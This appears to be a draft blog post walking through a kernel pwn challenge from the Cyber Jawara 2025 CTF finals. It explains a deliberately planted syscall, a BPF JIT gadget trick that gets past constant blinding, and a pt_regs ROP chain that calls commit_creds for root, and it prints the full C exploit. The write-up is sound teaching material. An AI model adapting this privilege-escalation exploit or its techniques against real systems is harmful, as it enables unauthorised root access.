---
date: '2026-05-20T20:26:01+07:00'
draft: true
title: 'Kernel One Gadget (Cyber Jawara 2025 Finals)'
---

Some weeks ago, my team and I had the opportunity to attend the finals of a local CTF called Cyber Jawara. One of the pwn challenges there was `kernel-1`, a Linux kernel challenge with a custom syscall. During the actual competition, the challenge given to participants accidentally came without SMEP and SMAP enabled, so we solved it in an unintended way. The unintended exploit made a BPF JIT gadget, pivotted the stack to userland, and ran ret2usr shellcode.

After the competition ended, I revisited the challenge with SMEP and SMAP enabled. That makes the old ret2usr solution useless, so this post will focus on the final version of the exploit. The main idea is based on the kernel one gadget technique from [Google's kernelCTF research](https://github.com/google/security-research/blob/master/pocs/linux/kernelctf/CVE-2025-21700_lts_cos_mitigation/docs/novel-techniques.md), specifically the fact that cBPF jump offsets can still give predictable bytes even when BPF JIT hardening enables constant blinding.

## Challenge Overview
[Download Challenge Files](kernel1.zip)

The challenge files are pretty standard for a kernel challenge. It includes bzImage, rootfs, and a start script to name a few. The script used during the competition is as follows.

```bash
qemu-system-x86_64 \
  -cpu qemu64 \
  -m 2G \
  -smp 1 \
  -kernel bzImage \
  -initrd rootfs.cpio.gz \
  -hda flag \
  -append "nokaslr root=/dev/sda rw console=ttyS0 earlyprintk=serial oops=panic" \
  -netdev user,id=net0,hostfwd=tcp::2222-:22 \
  -device virtio-net-pci,netdev=net0 \
  -nographic -s
```

Notice that the kernel is booted with `nokaslr`, which is very nice for us. The important missing part is that there is no `+smep,+smap` in the CPU flags. For the post-competition solve, I changed the CPU line into this.

```bash
-cpu qemu64,+smep,+smap
```

The rootfs also sets some sysctls on boot.

```bash
echo 2 > /proc/sys/kernel/kptr_restrict
echo 1 > /proc/sys/kernel/dmesg_restrict
echo 1 > /proc/sys/net/core/bpf_jit_harden
```

So, as a summary, the setup we'll be dealing with is:

1. KASLR is off
2. SMEP and SMAP are on
3. BPF JIT is on
4. BPF JIT hardening is also on

The kernel is not stripped, which makes the first part pretty nice. Looking at the symbols, we find a suspicious syscall handler named `__x64_sys_win_cyber_jawara`.

```bash
$ readelf -sW vmlinux | grep win_cyber_jawara
164877: ffffffff814b9330   142 FUNC    GLOBAL DEFAULT    1 __x64_sys_win_cyber_jawara
180492: ffffffff814b93d0   141 FUNC    GLOBAL DEFAULT    1 __ia32_sys_win_cyber_jawara
```

To find the syscall number, we can use `sys_call_table`. In this case, the number is `472`.

## The Custom Syscall

Disassembling `__x64_sys_win_cyber_jawara` gives us the main vulnerability of the challenge.

```asm{linenos=true}
ffffffff814b9330 <__x64_sys_win_cyber_jawara>:
ffffffff814b9330: endbr64
ffffffff814b9334: mov    rax,QWORD PTR [rdi+0x70]
ffffffff814b9338: call   ffffffff8233bcb0 <__get_user_8>
ffffffff814b933d: cdqe
ffffffff814b933f: test   rax,rax
ffffffff814b9342: jne    ffffffff814b93b9
ffffffff814b9344: cmp    rdx,0xffffffff9fffffff
ffffffff814b934b: jbe    ffffffff814b93b2
ffffffff814b934d: mov    rax,rdx
ffffffff814b9350: mov    rdi,0x0
ffffffff814b9357: mov    rsi,0x0
ffffffff814b935e: mov    rbx,0x0
ffffffff814b9365: mov    rcx,0x0
ffffffff814b936c: mov    rdx,0x0
ffffffff814b9373: mov    r8,0x0
ffffffff814b937a: mov    r9,0x0
ffffffff814b9381: mov    r10,0x0
ffffffff814b9388: mov    r11,0x0
ffffffff814b938f: mov    r12,0x0
ffffffff814b9396: mov    r13,0x0
ffffffff814b939d: mov    r14,0x0
ffffffff814b93a4: mov    r15,0x0
ffffffff814b93ab: jmp    rax
```

The syscall takes a userland pointer as its argument. It reads 8 bytes from that pointer using `__get_user_8`, checks that the value is greater than `0xffffffff9fffffff`, clears a bunch of registers, then jumps to the value.

So, this basically gives us a controlled jump in kernelmode. Sounds easy at first, but you'll soon find out how restricting that greater than `0xffffffff9fffffff` check is. The normal kernel text region starts at around `0xffffffff81000000`, which is lower than `0xffffffff9fffffff`. So even though we know the addresses of useful kernel functions and gadgets, we can't directly jump to them.

The only executable region that satisfies the check is the module area around `0xffffffffc0000000`. If you take a look, there are a couple of useful gadgets in that area. However, after dumping the memory there a couple of times, I found out that the available gadgets and their addresses change on every boot. But after inspecting it some more, I noticed that it had a lot of references to BPF, and after some googling found out about BPF JIT programs. So the next question becomes, can we place useful bytes in the BPF JIT region, then jump there using the custom syscall? Fortunately yes, but there's one more problem.

## BPF JIT Hardening

Classic BPF filters can be attached to sockets using `SO_ATTACH_FILTER`. Since the kernel has BPF JIT enabled, those filters are compiled into executable kernel memory.

For example, a BPF instruction with an immediate value can turn into something like this.

```asm
mov eax, 0x11223344
```

If we jump into the middle of that instruction, the immediate bytes become instructions of our choice. This is quite a cool trick when abusing the BPF JIT.

However, the challenge has `bpf_jit_harden` enabled. With that option enabled, the kernel blinds constants. So instead of placing our immediate directly in memory, it emits some randomized value and then xors it back to the original value at runtime. So the ol' "put attacker controlled bytes in a BPF immediate" trick won't work here.

The trick from the kernelCTF writeup is to use `BPF_JMP | BPF_JA`. For a normal relative jump, the JIT emits something like this.

```asm
jmp <offset>
e9 xx xx xx xx
```

The jump offset is not blinded like normal constants. So if we carefully control the size of the instructions between the jump and its target, we can influence those `xx` bytes and make useful instructions appear when execution starts at a misaligned address.

The part from the Google writeup that matters here is the `Ai Bi 00 00` pattern. If a relative jump is encoded as:

```asm
e9 Ai Bi 00 00
```

and we start executing one byte after the `e9`, then `Ai` can become a single-byte instruction. After that, `Bi 00` can be used as a "nop". For example, `04 00` is just:

```asm
add al, 0x0
```

So if we can make `Ai = 0x58`, then the shifted instruction will become `pop rax` followed by a "nop". If we can make `Ai = 0xc3`, then it becomes `ret`.

During the competition, I used this to create the bytes for:

```asm
xchg esp, eax
ret
```

The opcodes are `0x94 0xc3`. So, I created a BPF jump where the encoded relative offset would contain those bytes. After jumping into the middle of the JIT code, it would execute `xchg esp, eax; ret`.

Then I mmap'd a fake stack at the lower 32 bits of the BPF JIT address. Since rax still contained the jump target from the syscall, `xchg esp, eax` pivoted the kernel stack into that mmap'd userland region. From there, the exploit ran ret2usr shellcode that called `commit_creds(&init_cred)`, restored the old kernel stack, and returned to userland.

This was enough for the competition, but it only worked because SMEP and SMAP were missing. With SMEP on, kernelmode can't execute my userland shellcode. With SMAP on, using a userland fake stack as the kernel stack also becomes a problem. So, we need a different plan.

## Dealing with SMEP and SMAP (Intended Solve)

The custom syscall clears registers before jumping, but it does not null out values already on the kernel stack. On x86_64, before any main syscall logic gets executed, the kernel saves user registers into a `pt_regs` struct on the kernel stack. This struct contains values from userland such as register values, stack pointers, next instruction pointer, etc.

This is perfect for us. If we fill those registers with a ROP chain before executing the syscall, the values will be copied into the kernel stack for us. Now, we only need a way to move `rsp` upward until it points into that saved `pt_regs` struct.

So, the new plan is:

1. Prepare a BPF JIT gadget that only adjusts the current kernel stack and returns
2. Put the real ROP chain in the registers before executing the syscall
3. Let syscall entry save those registers into `pt_regs`
4. Jump to the BPF JIT gadget
5. Use that gadget to bring `rsp` up to the saved registers
6. Continue execution as a normal kernel ROP chain

The gadgets I plan to use are a bunch of `pop rax`s followed by a `ret`. In reality, that chain will look something like this:

```asm
pop rax
add al, 0x0
add cl, ch
pop rax
add al, 0x0
add cl, ch
...
pop rax
add al, 0x0
add cl, ch
ret
```

The `add` instructions are just filler or "nop" instructions (as explained in the Google writeup) that don't matter for the exploit. The important part is the `pop rax`s that move our `rsp` up the stack. This solves our problem when SMEP and SMAP are enabled. We don't need to pivot to a fake userland stack anymore. We only need to go upwards on the current kernel stack until `rsp` points to the controlled `pt_regs` struct, then we `ret`.

## Making the BPF Gadget

Below is the BPF setup from the final exploit.

```c{linenos=true}
#define BPF_2_BYTES (struct sock_filter)BPF_STMT(BPF_ALU | BPF_NEG, 0)
#define BPF_3_BYTES (struct sock_filter)BPF_STMT(BPF_MISC | BPF_TAX, 0)

void setup_bpf_jit(void) {
    struct sock_filter filter[0x1000];
    int idx = 0;

    // spam pop rax's
    filter[idx++] = (struct sock_filter)BPF_STMT(BPF_JMP | BPF_JA, 2*222 - 7);
    filter[idx++] = (struct sock_filter)BPF_STMT(BPF_JMP | BPF_JA, 2*222 - 6);
    filter[idx++] = (struct sock_filter)BPF_STMT(BPF_JMP | BPF_JA, 2*222 - 5);
    filter[idx++] = (struct sock_filter)BPF_STMT(BPF_JMP | BPF_JA, 2*222 - 4);
    filter[idx++] = (struct sock_filter)BPF_STMT(BPF_JMP | BPF_JA, 2*222 - 3);
    filter[idx++] = (struct sock_filter)BPF_STMT(BPF_JMP | BPF_JA, 2*222 - 2);
    filter[idx++] = (struct sock_filter)BPF_STMT(BPF_JMP | BPF_JA, 2*222 - 1);
    filter[idx++] = (struct sock_filter)BPF_STMT(BPF_JMP | BPF_JA, 2*222);

    // ret
    filter[idx++] = (struct sock_filter)BPF_STMT(BPF_JMP | BPF_JA, 2*222 + 1 + 1 + 2*21);

    // padding instructions for pop rax's
    filter[idx++] = BPF_2_BYTES;
    for (int i = 0; i < 222; i++) {
        filter[idx++] = BPF_2_BYTES;
        filter[idx++] = BPF_3_BYTES;
    }

    // padding for ret
    filter[idx++] = BPF_2_BYTES;
    for (int i = 0; i < 21; i++) {
        filter[idx++] = BPF_2_BYTES;
        filter[idx++] = BPF_3_BYTES;
    }

    // final ret instruction
    filter[idx++] = (struct sock_filter)BPF_STMT(BPF_RET | BPF_K, 0);

    struct sock_fprog prog = {
        .len = idx,
        .filter = filter
    };

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock == -1) {
        perror("socket");
        exit(1);
    }

    if (setsockopt(sock, SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog)) < 0) {
        perror("setsockopt");
        exit(1);
    }

    puts("socket and bpf done");
}
```

The idea is mostly the same as the old exploit. `BPF_JMP | BPF_JA` gets emitted as a 5-byte relative jump. The padding is also arranged in 5-byte chunks using one 2-byte BPF instruction and one 3-byte BPF instruction. This makes the offset calculation much easier because moving by one padding pair means moving by exactly 5 bytes.

After installing the filter, the generated JIT code looks something like this.

```asm{linenos=true}
pwndbg> x/30i 0xffffffffc0000675
   0xffffffffc0000675: endbr64
   0xffffffffc0000679: push   rbx
   0xffffffffc000067a: push   r13
   0xffffffffc000067c: xor    eax,eax
   0xffffffffc000067e: xor    r13d,r13d
   0xffffffffc0000681: mov    rbx,rdi
   0xffffffffc0000684: jmp    0xffffffffc0000ae1
   0xffffffffc0000689: jmp    0xffffffffc0000ae6
   0xffffffffc000068e: jmp    0xffffffffc0000aeb
   0xffffffffc0000693: jmp    0xffffffffc0000af0
   0xffffffffc0000698: jmp    0xffffffffc0000af5
   0xffffffffc000069d: jmp    0xffffffffc0000afa
   0xffffffffc00006a2: jmp    0xffffffffc0000aff
   0xffffffffc00006a7: jmp    0xffffffffc0000b04
   0xffffffffc00006ac: jmp    0xffffffffc0000b74
   0xffffffffc00006b1: neg    eax
   0xffffffffc00006b3: neg    eax
   0xffffffffc00006b5: mov    r13,rax
   0xffffffffc00006b8: neg    eax
   0xffffffffc00006ba: mov    r13,rax
   ...
```

At first glance, this is just a bunch of normal relative jumps. The interesting part is what happens if we disassemble one byte into the first jump.

```asm{linenos=true}
pwndbg> x/30i 0xffffffffc0000684+1
   0xffffffffc0000685: pop    rax
   0xffffffffc0000686: add    al,0x0
   0xffffffffc0000688: add    cl,ch
   0xffffffffc000068a: pop    rax
   0xffffffffc000068b: add    al,0x0
   0xffffffffc000068d: add    cl,ch
   0xffffffffc000068f: pop    rax
   0xffffffffc0000690: add    al,0x0
   0xffffffffc0000692: add    cl,ch
   0xffffffffc0000694: pop    rax
   0xffffffffc0000695: add    al,0x0
   0xffffffffc0000697: add    cl,ch
   0xffffffffc0000699: pop    rax
   0xffffffffc000069a: add    al,0x0
   0xffffffffc000069c: add    cl,ch
   0xffffffffc000069e: pop    rax
   0xffffffffc000069f: add    al,0x0
   0xffffffffc00006a1: add    cl,ch
   0xffffffffc00006a3: pop    rax
   0xffffffffc00006a4: add    al,0x0
   0xffffffffc00006a6: add    cl,ch
   0xffffffffc00006a8: pop    rax
   0xffffffffc00006a9: add    al,0x0
   0xffffffffc00006ab: add    cl,ch
   0xffffffffc00006ad: ret
```

This is the exact `Ai` single-byte instruction trick from the Google writeup. The first few jumps have `Ai = 0x58`, so they become `pop rax` when executed from `+1`. The last jump has `Ai = 0xc3`, so it becomes `ret`. The `04 00` bytes after each `pop rax` are the `add al, 0x0` nop-like instruction.

The hardcoded jump target I used is:

```c
unsigned long target = 0xffffffffc0000679;
```

Since KASLR is off, all the normal kernel addresses are fixed. The BPF JIT address is still a bit annoying and the exploit can take a couple tries, but it was reliable enough for this challenge setup.

## Setting up the ROP Chain

The ROP chain itself is quite short.

```text
pop rdi
&init_cred
commit_creds
swapgs and iretq
user_rip
user_cs
user_rflags
user_sp
user_ss
```

Before executing the syscall, we need to fill our userland registers with the addresses of the above gadgets so that it will later go into `pt_regs` and subsequently the kernel stack.

```c{linenos=true}
save_state();

// set up rop chain in pt regs
// the order is r15 -> r14 -> r13 -> r12 -> rbp -> rbx -> r11 -> r10 -> r9
__asm__(
    ".intel_syntax noprefix;"
    "mov user_rbp, rbp;"
    "mov r15, 0xffffffff81273c85;" // pop rdi
    "mov r14, 0xffffffff82c0f680;" // &init_cred
    "mov r13, 0xffffffff812d6620;" // commit_creds
    "mov r12, 0xffffffff8100160a;" // swapgs and iretq
    "mov rbp, user_rip;"
    "mov rbx, user_cs;"
    "mov r11, user_rflags;"
    "mov r8, user_sp;"             // will become r10
    "push user_ss;"                // will become r9
    ".att_syntax;"
);

syscall(SYS_win_cyber_jawara, &target);
```

There is one small detail here. The C library's `syscall` wrapper moves arguments around before executing the actual `syscall` instruction.

```asm
mov    rax, rdi
mov    rdi, rsi
mov    rsi, rdx
mov    rdx, rcx
mov    r10, r8
mov    r8, r9
mov    r9, qword ptr [rsp + 8]
syscall
```

This is why the exploit puts `user_sp` in `r8` and pushes `user_ss` onto the stack. After the wrapper runs, `user_sp` will be in `r10` and `user_ss` will be in `r9`, which is where we want them to end up in the `pt_regs` struct.

Once the BPF `pop rax` chain reaches `pt_regs`, our privilege escalation ROP chain will finally be executed.

## Solver

```c{linenos=true}
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <linux/filter.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>

#define SYS_win_cyber_jawara 472

#define BPF_2_BYTES (struct sock_filter)BPF_STMT(BPF_ALU | BPF_NEG, 0)
#define BPF_3_BYTES (struct sock_filter)BPF_STMT(BPF_MISC | BPF_TAX, 0)

// hardcoded kernel module address since kaslr is off. but the exploit will still take a couple of tries to succeed
unsigned long target = 0xffffffffc0000679;

void shell(void) {
    execl("/bin/sh", "/bin/sh", NULL);
}

unsigned long user_rip = (unsigned long)shell;
unsigned long user_cs, user_rflags, user_sp, user_ss, user_rbp;

void save_state(void) {
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_sp, rsp;"
        "mov user_ss, ss;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}

void setup_bpf_jit(void) {
    struct sock_filter filter[0x1000];
    int idx = 0;

    // spam pop rax's
    filter[idx++] = (struct sock_filter)BPF_STMT(BPF_JMP | BPF_JA, 2*222 - 7);
    filter[idx++] = (struct sock_filter)BPF_STMT(BPF_JMP | BPF_JA, 2*222 - 6);
    filter[idx++] = (struct sock_filter)BPF_STMT(BPF_JMP | BPF_JA, 2*222 - 5);
    filter[idx++] = (struct sock_filter)BPF_STMT(BPF_JMP | BPF_JA, 2*222 - 4);
    filter[idx++] = (struct sock_filter)BPF_STMT(BPF_JMP | BPF_JA, 2*222 - 3);
    filter[idx++] = (struct sock_filter)BPF_STMT(BPF_JMP | BPF_JA, 2*222 - 2);
    filter[idx++] = (struct sock_filter)BPF_STMT(BPF_JMP | BPF_JA, 2*222 - 1);
    filter[idx++] = (struct sock_filter)BPF_STMT(BPF_JMP | BPF_JA, 2*222);

    // ret
    filter[idx++] = (struct sock_filter)BPF_STMT(BPF_JMP | BPF_JA, 2*222 + 1 + 1 + 2*21);

    // padding instructions for pop rax's
    // since the BPF_JA from before gets converted to a 5 byte instruction,
    // the key is to make the padding a multiple of 5 as well so we can easily subtract the total skipped instructions in the jump and still get the same offset
    filter[idx++] = BPF_2_BYTES;
    for (int i = 0; i < 222; i++) {
        filter[idx++] = BPF_2_BYTES;
        filter[idx++] = BPF_3_BYTES;
    }

    // padding for ret
    filter[idx++] = BPF_2_BYTES;
    for (int i = 0; i < 21; i++) {
        filter[idx++] = BPF_2_BYTES;
        filter[idx++] = BPF_3_BYTES;
    }

    // final ret instruction
    filter[idx++] = (struct sock_filter)BPF_STMT(BPF_RET | BPF_K, 0);

    struct sock_fprog prog = {
        .len = idx,
        .filter = filter
    };

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock == -1) {
        perror("socket");
        exit(1);
    }

    if (setsockopt(sock, SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog)) < 0) {
        perror("setsockopt");
        exit(1);
    }

    puts("socket and bpf done");
}

int main(void) {
    setup_bpf_jit();

    save_state();

    // set up rop chain in pt regs
    // the order is r15 -> r14 -> r13 -> r12 -> rbp -> rbx -> r11 -> r10 -> r9
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_rbp, rbp;"
        "mov r15, 0xffffffff81273c85;" // pop rdi
        "mov r14, 0xffffffff82c0f680;" // &init_cred
        "mov r13, 0xffffffff812d6620;" // commit_creds
        "mov r12, 0xffffffff8100160a;" // swapgs and iretq
        "mov rbp, user_rip;"
        "mov rbx, user_cs;"
        "mov r11, user_rflags;"
        "mov r8, user_sp;" // will become r10
        "push user_ss;" // will become r9. disassembly/explanation of why below. the disass is right after stepping into the upcoming syscall function
        ".att_syntax;"
        /*
            0x4220b0    endbr64
            0x4220b4    mov    rax, rdi                    RAX => 0x1d8
            0x4220b7    mov    rdi, rsi                    RDI => 0x401a25 ◂— 0x841f0f66ffff
            0x4220ba    mov    rsi, rdx                    RSI => 0
            0x4220bd    mov    rdx, rcx                    RDX => 0
            0x4220c0    mov    r10, r8                     R10 => 0x78
            0x4220c3    mov    r8, r9                      R8 => 0x2b
            0x4220c6    mov    r9, qword ptr [rsp + 8]     R9, [0x7fffcee63a90] => 0x11223344
            0x4220cb    syscall  <SYS_<unk_472>>
        */
    );

    syscall(SYS_win_cyber_jawara, &target);

    // restore rbp so it doesn't cause a stack smash
    __asm__(
        ".intel_syntax noprefix;"
        "mov rbp, user_rbp;"
        ".att_syntax;"
    );

    return 0;
}
```

## Conclusion

So, the things we did in this exploit are:

1. Found a custom syscall named `win_cyber_jawara` with syscall number `472`
2. Found that the syscall gives us a controlled kernel jump, but only to addresses above `0xffffffff9fffffff`
3. Used the BPF JIT region as our executable target since it lives around `0xffffffffc0000000`
4. Used `BPF_JMP | BPF_JA` to get predictable bytes even with `bpf_jit_harden` enabled
5. Used the research findings from the kernelCTF writeup to make the JIT code decode as a bunch of `pop rax`s followed by `ret`
6. Put the real ROP chain inside the syscall `pt_regs` frame by filling registers before executing the syscall
7. Used the `pop rax` gadget to move the kernel stack up to that saved frame
8. Called `commit_creds(&init_cred)` and returned cleanly to userland with `swapgs; iretq`

## References

1. Google Security Research - [Novel Techniques: Kernel One Gadget](https://github.com/google/security-research/blob/master/pocs/linux/kernelctf/CVE-2025-21700_lts_cos_mitigation/docs/novel-techniques.md)
